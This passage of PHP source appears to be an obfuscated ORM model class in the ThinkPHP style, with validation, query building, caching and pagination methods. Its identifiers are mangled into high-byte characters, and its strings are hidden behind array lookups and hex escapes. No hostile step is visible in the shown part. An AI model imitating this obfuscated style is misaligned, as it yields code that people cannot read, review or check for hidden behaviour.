$¿¯ûğ¦÷[2] = THINK_MODEL_INSERT; } if ($·ß‰Ç™¡ == $¿¯ûğ¦÷[2] || $¿¯ûğ¦÷[2] == THINK_MODEL_BOTH) { switch (trim($¿¯ûğ¦÷[3])) { case $¬ŒÌØâó[398]: case $¬ŒÌØâó[399]: $©»•«§Å = isset($¿¯ûğ¦÷[4]) ? (array) $¿¯ûğ¦÷[4] : array(); if (isset($ËŠ·Ø€[$¿¯ûğ¦÷[0]])) { array_unshift($©»•«§Å, $ËŠ·Ø€[$¿¯ûğ¦÷[0]]); } if ($¬ŒÌØâó[398] == $¿¯ûğ¦÷[3]) { $ËŠ·Ø€[$¿¯ûğ¦÷[0]] = call_user_func_array($¿¯ûğ¦÷[1], $©»•«§Å); } else { $ËŠ·Ø€[$¿¯ûğ¦÷[0]] = call_user_func_array(array(&$this, $¿¯ûğ¦÷[1]), $©»•«§Å); } break; case $¬ŒÌØâó[353]: $ËŠ·Ø€[$¿¯ûğ¦÷[0]] = $ËŠ·Ø€[$¿¯ûğ¦÷[1]]; break; case $¬ŒÌØâó[400]: if ($¬ŒÌØâó[12] === $ËŠ·Ø€[$¿¯ûğ¦÷[0]]) { unset($ËŠ·Ø€[$¿¯ûğ¦÷[0]]); } break; case $¬ŒÌØâó[401]: default: $ËŠ·Ø€[$¿¯ûğ¦÷[0]] = $¿¯ûğ¦÷[1]; } if (!1 === $ËŠ·Ø€[$¿¯ûğ¦÷[0]]) { unset($ËŠ·Ø€[$¿¯ûğ¦÷[0]]); } } } } return $ËŠ·Ø€; } protected function autoValidation($ÙˆÜØ­, $õİ¤èé) { $£…£½Ï =& $_SERVER[±Ö‰ô½¯]; if (!empty($this->options[$£…£½Ï[402]])) { $ŞšùÈÑ³ = $this->options[$£…£½Ï[402]]; unset($this->options[$£…£½Ï[402]]); } elseif (!empty($this->_validate)) { $ŞšùÈÑ³ = $this->_validate; } if (isset($ŞšùÈÑ³)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ŞšùÈÑ³ as $üöĞ¸ò‹ => $§€ÆİËØ) { if (empty($§€ÆİËØ[5]) || $§€ÆİËØ[5] == THINK_MODEL_BOTH || $§€ÆİËØ[5] == $õİ¤èé) { if (0 == strpos($§€ÆİËØ[2], $£…£½Ï[403]) && strpos($§€ÆİËØ[2], $£…£½Ï[404])) { $§€ÆİËØ[2] = think_lang(substr($§€ÆİËØ[2], 2, -1)); } $§€ÆİËØ[3] = isset($§€ÆİËØ[3]) ? $§€ÆİËØ[3] : THINK_EXISTS_VALIDATE; $§€ÆİËØ[4] = isset($§€ÆİËØ[4]) ? $§€ÆİËØ[4] : $£…£½Ï[405]; switch ($§€ÆİËØ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÙˆÜØ­, $§€ÆİËØ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($£…£½Ï[12] != trim($ÙˆÜØ­[$§€ÆİËØ[0]])) { if (!1 === $this->_validationField($ÙˆÜØ­, $§€ÆİËØ)) { return !1; } } break; default: if (isset($ÙˆÜØ­[$§€ÆİËØ[0]])) { if (!1 === $this->_validationField($ÙˆÜØ­, $§€ÆİËØ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¶Ğ…Õ, $ÏßÕ”Õ) { if (!1 === $this->_validationFieldItem($¶Ğ…Õ, $ÏßÕ”Õ)) { if ($this->patchValidate) { $this->error[$ÏßÕ”Õ[0]] = $ÏßÕ”Õ[2]; } else { $this->error = $ÏßÕ”Õ[2]; return !1; } } return; } protected function _validationFieldItem($Îíé‚šû, $ï¶°•ø©) { $‰’¦«„§ =& $_SERVER[±Ö‰ô½¯]; switch (strtolower(trim($ï¶°•ø©[4]))) { case $‰’¦«„§[398]: case $‰’¦«„§[399]: $ãÏİ©–¦ = isset($ï¶°•ø©[6]) ? (array) $ï¶°•ø©[6] : array(); if (is_string($ï¶°•ø©[0]) && strpos($ï¶°•ø©[0], $‰’¦«„§[50])) { $ï¶°•ø©[0] = explode($‰’¦«„§[50], $ï¶°•ø©[0]); } if (is_array($ï¶°•ø©[0])) { foreach ($ï¶°•ø©[0] as $ØÙ«®ã÷) { $¶ÜÙŠó [$ØÙ«®ã÷] = $Îíé‚šû[$ØÙ«®ã÷]; } array_unshift($ãÏİ©–¦, $¶ÜÙŠó ); } else { array_unshift($ãÏİ©–¦, $Îíé‚šû[$ï¶°•ø©[0]]); } if ($‰’¦«„§[398] == $ï¶°•ø©[4]) { return call_user_func_array($ï¶°•ø©[1], $ãÏİ©–¦); } else { return call_user_func_array(array(&$this, $ï¶°•ø©[1]), $ãÏİ©–¦); } case $‰’¦«„§[406]: return $Îíé‚šû[$ï¶°•ø©[0]] == $Îíé‚šû[$ï¶°•ø©[1]]; case $‰’¦«„§[407]: if (is_string($ï¶°•ø©[0]) && strpos($ï¶°•ø©[0], $‰’¦«„§[50])) { $ï¶°•ø©[0] = explode($‰’¦«„§[50], $ï¶°•ø©[0]); } $¨ı“õßç = array(); if (is_array($ï¶°•ø©[0])) { foreach ($ï¶°•ø©[0] as $ØÙ«®ã÷) { $¨ı“õßç[$ØÙ«®ã÷] = $Îíé‚šû[$ØÙ«®ã÷]; } } else { $¨ı“õßç[$ï¶°•ø©[0]] = $Îíé‚šû[$ï¶°•ø©[0]]; } if (!empty($Îíé‚šû[$this->getPk()])) { $¨ı“õßç[$this->getPk()] = array($‰’¦«„§[408], $Îíé‚šû[$this->getPk()]); } if ($this->where($¨ı“õßç)->find()) { return !1; } return !0; default: return $this->check($Îíé‚šû[$ï¶°•ø©[0]], $ï¶°•ø©[1], $ï¶°•ø©[4]); } } public function check($¯ƒ›¦Á, $ë¥§ÚœÌ, $òËØüÆ = "\162\145\x67\145\170") { $ƒ“¤Òñ¼ =& $_SERVER[±Ö‰ô½¯]; $òËØüÆ = strtolower(trim($òËØüÆ)); switch ($òËØüÆ) { case $ƒ“¤Òñ¼[7]: case $ƒ“¤Òñ¼[409]: $ç’àôˆÁ = is_array($ë¥§ÚœÌ) ? $ë¥§ÚœÌ : explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ); return $òËØüÆ == $ƒ“¤Òñ¼[7] ? in_array($¯ƒ›¦Á, $ç’àôˆÁ) : !in_array($¯ƒ›¦Á, $ç’àôˆÁ); case $ƒ“¤Òñ¼[410]: case $ƒ“¤Òñ¼[411]: if (is_array($ë¥§ÚœÌ)) { $ªÆş”Ğı = $ë¥§ÚœÌ[0]; $½îáæö = $ë¥§ÚœÌ[1]; } else { list($ªÆş”Ğı, $½îáæö) = explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ); } return $òËØüÆ == $ƒ“¤Òñ¼[410] ? $¯ƒ›¦Á >= $ªÆş”Ğı && $¯ƒ›¦Á <= $½îáæö : $¯ƒ›¦Á < $ªÆş”Ğı || $¯ƒ›¦Á > $½îáæö; case $ƒ“¤Òñ¼[412]: case $ƒ“¤Òñ¼[413]: return $òËØüÆ == $ƒ“¤Òñ¼[412] ? $¯ƒ›¦Á == $ë¥§ÚœÌ : $¯ƒ›¦Á != $ë¥§ÚœÌ; case $ƒ“¤Òñ¼[414]: $‹¶ÌÅ™· = mb_strlen($¯ƒ›¦Á, $ƒ“¤Òñ¼[415]); if (strpos($ë¥§ÚœÌ, $ƒ“¤Òñ¼[50])) { list($ªÆş”Ğı, $½îáæö) = explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ); return $‹¶ÌÅ™· >= $ªÆş”Ğı && $‹¶ÌÅ™· <= $½îáæö; } else { return $‹¶ÌÅ™· == $ë¥§ÚœÌ; } case $ƒ“¤Òñ¼[416]: list($“ÆÚ„Åä, $â ’±¼) = explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ); if (!is_numeric($“ÆÚ„Åä)) { $“ÆÚ„Åä = strtotime($“ÆÚ„Åä); } if (!is_numeric($â ’±¼)) { $â ’±¼ = strtotime($â ’±¼); } return NOW_TIME >= $“ÆÚ„Åä && NOW_TIME <= $â ’±¼; case $ƒ“¤Òñ¼[417]: return in_array(get_client_ip(), explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ)); case $ƒ“¤Òñ¼[418]: return !in_array(get_client_ip(), explode($ƒ“¤Òñ¼[50], $ë¥§ÚœÌ)); case $ƒ“¤Òñ¼[405]: default: return $this->regex($¯ƒ›¦Á, $ë¥§ÚœÌ); } } public function query($‘Ô‚‹ Ö, $æ·¬„°¡ = false) { $›ğş¿·œ =& $_SERVER[±Ö‰ô½¯]; if (!is_bool($æ·¬„°¡) && !is_array($æ·¬„°¡)) { $æ·¬„°¡ = func_get_args(); array_shift($æ·¬„°¡); } $‘Ô‚‹ Ö = str_replace(array($›ğş¿·œ[287], $›ğş¿·œ[419]), $›ğş¿·œ[53], $‘Ô‚‹ Ö); $‘Ô‚‹ Ö = $this->parseSql($‘Ô‚‹ Ö, $æ·¬„°¡); return $this->db->query($‘Ô‚‹ Ö); } public function execute($ˆ¨¼¡†Ê, $è—²ß¾Û = false) { if (!is_bool($è—²ß¾Û) && !is_array($è—²ß¾Û)) { $è—²ß¾Û = func_get_args(); array_shift($è—²ß¾Û); } $ˆ¨¼¡†Ê = $this->parseSql($ˆ¨¼¡†Ê, $è—²ß¾Û); return $this->db->execute($ˆ¨¼¡†Ê); } protected function parseSql($³È«°†Ş, $“ò¨îÀµ) { $Ñ­‚¦‡ =& $_SERVER[±Ö‰ô½¯]; if (!0 === $“ò¨îÀµ) { $Š›¢ÅıÓ = $this->_parseOptions(); $³È«°†Ş = $this->db->parseSql($³È«°†Ş, $Š›¢ÅıÓ); } elseif (is_array($“ò¨îÀµ)) { $“ò¨îÀµ = array_map(array($this->db, $Ñ­‚¦‡[420]), $“ò¨îÀµ); $³È«°†Ş = vsprintf($³È«°†Ş, $“ò¨îÀµ); } else { $³È«°†Ş = strtr($³È«°†Ş, array($Ñ­‚¦‡[421] => $this->getTableName(), $Ñ­‚¦‡[422] => think_config($Ñ­‚¦‡[323]))); } $this->db->setModel($this->name); return $³È«°†Ş; } public function db($ú¶ù—²¢ = '', $ç÷ªò¨ò = '', $üııÆÔ¤ = array()) { $¾×Õ™©ı =& $_SERVER[±Ö‰ô½¯]; if ($¾×Õ™©ı[12] === $ú¶ù—²¢ && $this->db) { return $this->db; } static $¨€áùæ† = array(); static $Ì•è® = array(); if (!isset($Ì•è®[$ú¶ù—²¢]) || isset($Ì•è®[$ú¶ù—²¢]) && $ç÷ªò¨ò && $¨€áùæ†[$ú¶ù—²¢] != $ç÷ªò¨ò) { if (!empty($ç÷ªò¨ò) && is_string($ç÷ªò¨ò) && !1 === strpos($ç÷ªò¨ò, $¾×Õ™©ı[8])) { $ç÷ªò¨ò = think_config($ç÷ªò¨ò); } $ú¶ù—²¢ = think_guid($ç÷ªò¨ò); $Ì•è®[$ú¶ù—²¢] = Db::getInstance($ç÷ªò¨ò); } elseif (NULL === $ç÷ªò¨ò) { $Ì•è®[$ú¶ù—²¢]->close(); unset($Ì•è®[$ú¶ù—²¢]); return; } if (!empty($üııÆÔ¤)) { if (is_string($üııÆÔ¤)) { parse_str($üııÆÔ¤, $üııÆÔ¤); } foreach ($üııÆÔ¤ as $ÀÑĞôÉ => $ïş›ßºÖ) { $this->setProperty($ÀÑĞôÉ, $ïş›ßºÖ); } } $¨€áùæ†[$ú¶ù—²¢] = $ç÷ªò¨ò; $this->db = $Ì•è®[$ú¶ù—²¢]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ß¢Äşé† = get_class($this); if ($ß¢Äşé† == $_SERVER[±Ö‰ô½¯][423]) { return $this->name; } $this->name = substr($ß¢Äşé†, 0, -5); } return $this->name; } public function getTableName() { $—©Ü¥‡€ =& $_SERVER[±Ö‰ô½¯]; if (empty($this->trueTableName)) { $’Ì¼³©– = !empty($this->tablePrefix) ? $this->tablePrefix : $—©Ü¥‡€[12]; if (!empty($this->tableName)) { $’Ì¼³©– .= $this->tableName; } else { $’Ì¼³©– .= think_parse_name($this->name); } $this->trueTableName = strtolower($’Ì¼³©–); } return (!empty($this->dbName) ? $this->dbName . $—©Ü¥‡€[10] : $—©Ü¥‡€[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ŸâÅôƒ =& $_SERVER[±Ö‰ô½¯]; return isset($this->fields[$ŸâÅôƒ[330]]) ? $this->fields[$ŸâÅôƒ[330]] : $this->pk; } public function getDbFields() { $£½šªé =& $_SERVER[±Ö‰ô½¯]; if (isset($this->options[$£½šªé[359]])) { $ïÅ£öˆš = $this->db->getFields($this->options[$£½šªé[359]]); return $ïÅ£öˆš ? array_keys($ïÅ£öˆš) : !1; } if ($this->fields) { $ïÅ£öˆš = $this->fields; unset($ïÅ£öˆš[$£½šªé[329]], $ïÅ£öˆš[$£½šªé[330]], $ïÅ£öˆš[$£½šªé[331]], $ïÅ£öˆš[$£½šªé[328]]); return $ïÅ£öˆš; } return !1; } public function data($®åˆäÏÅ = '') { $»“É½ò¿ =& $_SERVER[±Ö‰ô½¯]; if ($»“É½ò¿[12] === $®åˆäÏÅ && !empty($this->data)) { return $this->data; } if (is_object($®åˆäÏÅ)) { $®åˆäÏÅ = get_object_vars($®åˆäÏÅ); } elseif (is_string($®åˆäÏÅ)) { parse_str($®åˆäÏÅ, $®åˆäÏÅ); } elseif (!is_array($®åˆäÏÅ)) { think_exception(think_lang($»“É½ò¿[351])); } $this->data = $®åˆäÏÅ; return $this; } public function join($îÈ—Æ²¸) { $øõÀ÷Î§ =& $_SERVER[±Ö‰ô½¯]; if (is_array($îÈ—Æ²¸)) { $this->options[$øõÀ÷Î§[362]] = $îÈ—Æ²¸; } elseif (!empty($îÈ—Æ²¸)) { $this->options[$øõÀ÷Î§[362]][] = $îÈ—Æ²¸; } return $this; } public function union($†³â™ãê, $íõåœŸ = false) { $†³İ÷ÀÏ =& $_SERVER[±Ö‰ô½¯]; if (empty($†³â™ãê)) { return $this; } if ($íõåœŸ) { $this->options[$†³İ÷ÀÏ[424]][$†³İ÷ÀÏ[425]] = !0; } if (is_object($†³â™ãê)) { $†³â™ãê = get_object_vars($†³â™ãê); } if (is_string($†³â™ãê)) { $Ã©æóçÀ = $†³â™ãê; } elseif (is_array($†³â™ãê)) { if (isset($†³â™ãê[0])) { $this->options[$†³İ÷ÀÏ[424]] = array_merge($this->options[$†³İ÷ÀÏ[424]], $†³â™ãê); return $this; } else { $Ã©æóçÀ = $†³â™ãê; } } else { think_exception(think_lang($†³İ÷ÀÏ[351])); } $this->options[$†³İ÷ÀÏ[424]][] = $Ã©æóçÀ; return $this; } public function cache($­¨ëÌèâ = true, $°æ¦’â— = null, $»Ñß™½Ì = '') { $ííãª£ =& $_SERVER[±Ö‰ô½¯]; if (!1 !== $­¨ëÌèâ) { $this->options[$ííãª£[426]] = array($ííãª£[95] => $­¨ëÌèâ, $ííãª£[416] => $°æ¦’â—, $ííãª£[33] => $»Ñß™½Ì); } return $this; } public function field($ü†õ¦Õö, $íÈÕ¾Ä» = false) { $Å ×–µß =& $_SERVER[±Ö‰ô½¯]; if (!0 === $ü†õ¦Õö) { $Œ×ùŒ¼„ = $this->getDbFields(); $ü†õ¦Õö = $Œ×ùŒ¼„ ? $Œ×ùŒ¼„ : $Å ×–µß[222]; } elseif ($íÈÕ¾Ä») { if (is_string($ü†õ¦Õö)) { $ü†õ¦Õö = explode($Å ×–µß[50], $ü†õ¦Õö); } $Œ×ùŒ¼„ = $this->getDbFields(); $ü†õ¦Õö = $Œ×ùŒ¼„ ? array_diff($Œ×ùŒ¼„, $ü†õ¦Õö) : $ü†õ¦Õö; } $this->options[$Å ×–µß[353]] = $ü†õ¦Õö; return $this; } public function scope($Ò¦ùã–ƒ = '', $õƒÃó‹ = NULL) { $çè·¶Šê =& $_SERVER[±Ö‰ô½¯]; if ($çè·¶Šê[12] === $Ò¦ùã–ƒ) { if (isset($this->_scope[$çè·¶Šê[37]])) { $‘ÕàúŒ¬ = $this->_scope[$çè·¶Šê[37]]; } else { return $this; } } elseif (is_string($Ò¦ùã–ƒ)) { $í”’¥Ëñ = explode($çè·¶Šê[50], $Ò¦ùã–ƒ); $‘ÕàúŒ¬ = array(); foreach ($í”’¥Ëñ as $‡†Öç¯¥) { if (!isset($this->_scope[$‡†Öç¯¥])) { continue; } $‘ÕàúŒ¬ = array_merge($‘ÕàúŒ¬, $this->_scope[$‡†Öç¯¥]); } if (!empty($õƒÃó‹) && is_array($õƒÃó‹)) { $‘ÕàúŒ¬ = array_merge($‘ÕàúŒ¬, $õƒÃó‹); } } elseif (is_array($Ò¦ùã–ƒ)) { $‘ÕàúŒ¬ = $Ò¦ùã–ƒ; } if (is_array($‘ÕàúŒ¬) && !empty($‘ÕàúŒ¬)) { $this->options = array_merge($this->options, array_change_key_case($‘ÕàúŒ¬)); } return $this; } public function where($¦ÏÙÄş€, $’¨Ù»î  = null) { $Š ù‘² =& $_SERVER[±Ö‰ô½¯]; if (!is_null($’¨Ù»î ) && is_string($¦ÏÙÄş€)) { if (!is_array($’¨Ù»î )) { $’¨Ù»î  = func_get_args(); array_shift($’¨Ù»î ); } $’¨Ù»î  = array_map(array($this->db, $Š ù‘²[420]), $’¨Ù»î ); $¦ÏÙÄş€ = vsprintf($¦ÏÙÄş€, $’¨Ù»î ); } elseif (is_object($¦ÏÙÄş€)) { $¦ÏÙÄş€ = get_object_vars($¦ÏÙÄş€); } elseif (is_array($¦ÏÙÄş€)) { foreach ($¦ÏÙÄş€ as $Ñ×í““ƒ => $È²—óóı) { if ((is_numeric($Ñ×í““ƒ) || !$Ñ×í““ƒ) && is_string($È²—óóı)) { if (strpos($È²—óóı, $Š ù‘²[427]) === 0) { continue; } think_trace($Š ù‘²[428], $Š ù‘²[12], $Š ù‘²[49]); die; } } } if (is_string($¦ÏÙÄş€) && $Š ù‘²[12] != $¦ÏÙÄş€) { $ÃÜÃæäª = array(); $ÃÜÃæäª[$Š ù‘²[429]] = $¦ÏÙÄş€; $¦ÏÙÄş€ = $ÃÜÃæäª; } if (isset($this->options[$Š ù‘²[355]])) { $this->options[$Š ù‘²[355]] = array_merge($this->options[$Š ù‘²[355]], $¦ÏÙÄş€); } else { $this->options[$Š ù‘²[355]] = $¦ÏÙÄş€; } return $this; } public function limit($áŞ·„°½, $Á“¢ÍÄ = null) { $€ô‡Àöï =& $_SERVER[±Ö‰ô½¯]; $this->options[$€ô‡Àöï[370]] = is_null($Á“¢ÍÄ) ? $áŞ·„°½ : $áŞ·„°½ . $€ô‡Àöï[50] . $Á“¢ÍÄ; return $this; } public function page($ôö‡óÀ‘, $Î«ĞƒÀ— = null) { $¸ŠÚ÷„„ =& $_SERVER[±Ö‰ô½¯]; $this->options[$¸ŠÚ÷„„[430]] = is_null($Î«ĞƒÀ—) ? $ôö‡óÀ‘ : $ôö‡óÀ‘ . $¸ŠÚ÷„„[50] . $Î«ĞƒÀ—; return $this; } public function comment($çÏ´Ù) { $this->options[$_SERVER[±Ö‰ô½¯][431]] = $çÏ´Ù; return $this; } public function setProperty($•†ã•ò¹, $ÌÅú¯³Ö) { if (property_exists($this, $•†ã•ò¹)) { $this->{$•†ã•ò¹} = $ÌÅú¯³Ö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\124\x69\155\x65", "\164\x69\155\145", "\151\156\163\145\x72\164\x2c\x75\x70\x64\141\164\x65", "\x66\165\x6e\x63\164\x69\157\156"), array("\x63\162\145\x61\164\145\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\x63\164\x69\x6f\156")); public function setDataAuto($Òº›¶æ) { $this->dataAuto = $Òº›¶æ; } public function __construct($¨ñå‚£³ = '', $Áº‚ÙãÓ = '', $È¶ŠµŠ = '') { parent::__construct($¨ñå‚£³, $Áº‚ÙãÓ, $È¶ŠµŠ); } protected $tableMeta = array(); protected function _beforeInsert(&$ÑØËÍá, $İöºâÍœ) { $º­¼ÎôÌ =& $_SERVER[±Ö‰ô½¯]; if (!$this->checkDataAutoHas($º­¼ÎôÌ[432])) { return; } $this->dataBeforeFilter($ÑØËÍá, $º­¼ÎôÌ[432]); } protected function _beforeUpdate(&$½ò¹Ì©, $Êúö¤‰ô) { $áƒÕĞÁÑ =& $_SERVER[±Ö‰ô½¯]; if (!$this->checkDataAutoHas($áƒÕĞÁÑ[433])) { return; } $this->dataBeforeFilter($½ò¹Ì©, $áƒÕĞÁÑ[433]); } protected function _afterSelect(&$Îô•îÖô, $®…­û¤Ü) { if (!is_array($Îô•îÖô)) { return; } if (!$this->checkDataAutoHas($_SERVER[±Ö‰ô½¯][434])) { return; } foreach ($Îô•îÖô as &$×öÙÀÃ›) { $this->dataAfterFilter($×öÙÀÃ›); } unset($×öÙÀÃ›); } protected function _afterFind(&$£©Ğ¤Óº, $ÜÜïïè´) { if (!is_array($£©Ğ¤Óº)) { return; } if (!$this->checkDataAutoHas($_SERVER[±Ö‰ô½¯][434])) { return; } $this->dataAfterFilter($£©Ğ¤Óº); } public static function textEncode($ìç•ŞÍ›) { if (!$ìç•ŞÍ›) { return $ìç•ŞÍ›; } $¬ÚÅĞ±ò = json_encode($ìç•ŞÍ›); $¬ÚÅĞ±ò = preg_replace_callback($_SERVER[±Ö‰ô½¯][435], function ($ ´¼ªô) { return addslashes($ ´¼ªô[0]); }, $¬ÚÅĞ±ò); return json_decode($¬ÚÅĞ±ò); } public static function textDecode($‚®æÇİÑ) { $ü»°£©ğ =& $_SERVER[±Ö‰ô½¯]; if (!$‚®æÇİÑ) { return $‚®æÇİÑ; } $ÔÊÃßÏÙ = json_encode($‚®æÇİÑ); $ÔÊÃßÏÙ = preg_replace_callback($ü»°£©ğ[436], function ($ß›ÇæÚ¸) { return $_SERVER[±Ö‰ô½¯][98]; }, $ÔÊÃßÏÙ); return json_decode($ÔÊÃßÏÙ); } public function setAutoIncrement($›ËĞÒÙá) { $ÒÏÜõªö = array($this->getPk() => $›ËĞÒÙá); $„œòø×é = $this->data($ÒÏÜõªö)->add(); if ($„œòø×é) { $this->delete($„œòø×é); } } public function getAutoIncrement() { $êÙÊéÃû = $this->getTableName(); $’€øÛ­˜ = $this->max($this->getPk()); $èÕ‘—íó = $this->query("\x73\x68\157\167\40\164\x61\x62\154\x65\40\163\x74\x61\164\x75\x73\40\x77\x68\x65\162\x65\x20\116\x61\155\x65\x3d\47{$êÙÊéÃû}\x27"); $ÎÃç­ê« = $èÕ‘—íó[0][$_SERVER[±Ö‰ô½¯][437]]; $şÅÜãûú = max($’€øÛ­˜, $ÎÃç­ê«); return $şÅÜãûú; } protected function _callBefore($ªè¥Š˜, $ÓØŒä) { return $this->cacheCallCheck($ªè¥Š˜, $ÓØŒä, !1); } protected function _callAfter($‡ûï”€ˆ, $Ê’ıöÕ) { return $this->cacheCallCheck($‡ûï”€ˆ, $Ê’ıöÕ, !0); } protected function cacheFunctionAlias($ì–×Æ·) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($íÉ•Îœ¤, $Üû£½¤Ô, $ĞïÏÕ = false) { $ˆ´Æá¥ =& $_SERVER[±Ö‰ô½¯]; $îúØÑ ¡ = $this->cacheFunctionAlias($Üû£½¤Ô); if (!$îúØÑ ¡) { return; } foreach ($îúØÑ ¡ as $Ä÷«ïõä => $šãÀêó) { $¹áÙùÒš = $šãÀêó[0]; $î»Ëäéİ = explode($ˆ´Æá¥[50], $šãÀêó[1]); $ìçÜÄÔì = isset($šãÀêó[2]) ? $šãÀêó[2] : $ˆ´Æá¥[12]; if ($íÉ•Îœ¤ == $Ä÷«ïõä) { return $this->cacheFunctionGet($Ä÷«ïõä, $¹áÙùÒš, $ìçÜÄÔì); } if ($ĞïÏÕ && in_array($íÉ•Îœ¤, $î»Ëäéİ)) { $this->cacheFunctionClear($Ä÷«ïõä, $¹áÙùÒš, $ìçÜÄÔì); } } } public function cacheFunctionGet($µ¤íÅçÛ, $†íë¹ƒ¤, $ì™›åÇ = '') { $È±ÕùÉı =& $_SERVER[±Ö‰ô½¯]; $¸åŒâşã = $this->cacheKeyMake($µ¤íÅçÛ, $†íë¹ƒ¤, $ì™›åÇ); $¢ôà¢ßÑ = Cache::get($¸åŒâşã); if (!is_array($¢ôà¢ßÑ)) { if (method_exists($this, $È±ÕùÉı[343] . $µ¤íÅçÛ)) { $µ¤íÅçÛ = $È±ÕùÉı[343] . $µ¤íÅçÛ; } $¢ôà¢ßÑ = call_user_func_array(array($this, $µ¤íÅçÛ), array($†íë¹ƒ¤, !0)); Cache::set($¸åŒâşã, $¢ôà¢ßÑ); } return $¢ôà¢ßÑ; } public function cacheFunctionClear($Î§øƒó, $úëÕäšÇ, $ËÊ“¤ = '') { $¶©‹ò¡ê = $úëÕäšÇ; if (!is_array($úëÕäšÇ)) { $¶©‹ò¡ê = array($úëÕäšÇ); } foreach ($¶©‹ò¡ê as $Ğ‹è›®ã) { $Û«Ú‰Îë = $this->cacheKeyMake($Î§øƒó, $Ğ‹è›®ã, $ËÊ“¤); Cache::remove($Û«Ú‰Îë); } } public function cacheKeyMake($¹ü‘«×, $€ñÏÀ†, $áåƒê¬‚) { $ûúîÎÜ =& $_SERVER[±Ö‰ô½¯]; if ($áåƒê¬‚) { $€ñÏÀ† = $€ñÏÀ† . $ûúîÎÜ[438] . $áåƒê¬‚; } return get_class($this) . $ûúîÎÜ[11] . $¹ü‘«× . $ûúîÎÜ[439] . $€ñÏÀ†; } protected function selectPageReset() { $ƒòÅ¼®Ğ =& $_SERVER[±Ö‰ô½¯]; if (isset($GLOBALS[$ƒòÅ¼®Ğ[440]])) { return; } $GLOBALS[$ƒòÅ¼®Ğ[440]] = isset($GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[441]]) ? $GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[441]] : !1; $GLOBALS[$ƒòÅ¼®Ğ[442]] = isset($GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[430]]) ? $GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[430]] : !1; $GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[441]] = !1; $GLOBALS[$ƒòÅ¼®Ğ[7]][$ƒòÅ¼®Ğ[430]] = !1; } protected function selectPageRestore() { $­‚ö—½‚ =& $_SERVER[±Ö‰ô½¯]; if (!isset($GLOBALS[$­‚ö—½‚[440]])) { return; } $GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[441]] = $GLOBALS[$­‚ö—½‚[440]]; $GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[430]] = $GLOBALS[$­‚ö—½‚[442]]; if ($GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[441]] === !1) { unset($GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[441]]); } if ($GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[430]] === !1) { unset($GLOBALS[$­‚ö—½‚[7]][$­‚ö—½‚[430]]); } unset($GLOBALS[$­‚ö—½‚[440]]); unset($GLOBALS[$­‚ö—½‚[442]]); } protected function selectPage($¾´ÓĞõ¢ = 200, $º†¿”úé = 1) { $¨à¿Ù±ñ =& $_SERVER[±Ö‰ô½¯]; global $in; $¥×ÆÛ– = $this->optionsValue(); $™—óŒ¶ = 50000; $¾´ÓĞõ¢ = isset($in[$¨à¿Ù±ñ[441]]) && $in[$¨à¿Ù±ñ[441]] ? $in[$¨à¿Ù±ñ[441]] : $¾´ÓĞõ¢; if ($¾´ÓĞõ¢ === -1) { $in[$¨à¿Ù±ñ[441]] = !1; $™—óŒ¶ = 100000000; $¾´ÓĞõ¢ = $™—óŒ¶; } $•¡‡ë¶ = $¥×ÆÛ–; $•¡‡ë¶[$¨à¿Ù±ñ[443]] = array(); $¾´ÓĞõ¢ = intval($¾´ÓĞõ¢); $¾´ÓĞõ¢ = $¾´ÓĞõ¢ <= 5 ? 5 : ($¾´ÓĞõ¢ >= $™—óŒ¶ ? $™—óŒ¶ : $¾´ÓĞõ¢); $º†¿”úé = intval(isset($in[$¨à¿Ù±ñ[430]]) && $in[$¨à¿Ù±ñ[430]] ? $in[$¨à¿Ù±ñ[430]] : $º†¿”úé); $º†¿”úé = $º†¿”úé <= 1 ? 1 : $º†¿”úé; $òÂ‚˜ï  = array(); $½êÆÈÜÅ = 1; if ($º†¿”úé == 1 && $½êÆÈÜÅ) { $this->optionsValue($¥×ÆÛ–); $òÂ‚˜ï  = $this->page($º†¿”úé, $¾´ÓĞõ¢)->select(); $òÉë¸‹Ê = is_array($òÂ‚˜ï ) ? count($òÂ‚˜ï ) : 0; if ($òÉë¸‹Ê < $¾´ÓĞõ¢) { $ŒÊä¶³û = 1; } else { $this->optionsValue($•¡‡ë¶); $òÉë¸‹Ê = intval($this->count()); $ŒÊä¶³û = ceil($òÉë¸‹Ê / $¾´ÓĞõ¢); } } else { $this->optionsValue($•¡‡ë¶); $òÉë¸‹Ê = intval($this->count()); $ŒÊä¶³û = ceil($òÉë¸‹Ê / $¾´ÓĞõ¢); $º†¿”úé = $º†¿”úé >= $ŒÊä¶³û ? $ŒÊä¶³û : $º†¿”úé; 